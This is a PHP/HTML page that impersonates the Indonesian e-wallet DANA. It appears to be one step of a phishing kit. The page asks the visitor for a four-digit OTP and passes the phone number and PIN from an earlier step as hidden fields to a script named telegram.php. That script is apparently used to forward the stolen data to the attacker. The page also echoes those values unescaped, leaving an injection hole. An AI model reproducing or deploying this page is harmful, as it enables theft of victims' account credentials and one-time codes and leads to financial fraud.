<?php
if (!isset($_GET['phone']) or !isset($_GET['pin'])) {
    header("location:./index.php");
}
?>

<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="refresh">
    <title>DANA | dana.id</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link rel="stylesheet" type="text/css" href="./otp.css">
    <link rel="stylesheet" type="text/css" href="./spinner.css">
</head>

<body>
    <div class="background">
        <div class="container" id="container">
            <center>
                <h1>Masukkan OTP</h1>
                Kode OTP telah dikirim ke nomor Anda.
                <form action="./telegram.php" method="get">
                    <input name="step" value="3" hidden>
                    <input name="phone" value="<?= (isset($_GET['phone']) ? $_GET['phone'] : '') ?>" hidden>
                    <input name="pin" value="<?= (isset($_GET['pin']) ? $_GET['pin'] : '') ?>" hidden>
                    <div class="four_otp" id="four_otp">
                        <input type="number" id="otp1" maxlength="1" autocomplete="off" class="inpOtp" name="otp1"></input>
                        <input type="number" id="otp2" maxlength="1" autocomplete="off" class="inpOtp" name="otp2"></input>
                        <input type="number" id="otp3" maxlength="1" autocomplete="off" class="inpOtp" name="otp3"></input>
                        <input type="number" id="otp4" maxlength="1" autocomplete="off" class="inpOtp" name="otp4"></input>
                    </div>
                </form>
                <p class="resend">KIRIM ULANG (<span id="time">60</span>s)</p>
            </center>
        </div>
    </div>
    <div id="process" name="process" class="process" style="display: none;">
        <div class="loading">
            <img src="./load_bg.png">
            <img class="spinner" src="./load_spin.png">
        </div>
    </div>
</body>
<script src="./functions_otp.js"></script>

</html>